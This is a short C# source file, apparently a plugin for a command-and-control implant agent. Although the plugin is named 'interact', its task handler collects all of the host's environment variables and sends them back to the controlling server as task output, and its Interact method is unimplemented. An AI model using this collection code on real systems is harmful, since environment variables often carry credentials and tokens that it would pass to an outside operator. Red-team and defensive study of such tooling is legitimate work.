using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;

namespace Agent
{
    public class Plugin : IInteractivePlugin, IPlugin
    {
        public string Name => "interact";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            string output = JsonSerializer.Serialize(Environment.GetEnvironmentVariables());

            await messageManager.AddResponse(new ResponseResult()
            {
                task_id = job.task.id,
                user_output = output,
                completed = true
            });
        }

        public void Interact(InteractMessage message)
        {
            throw new NotImplementedException();
        }
    }
}
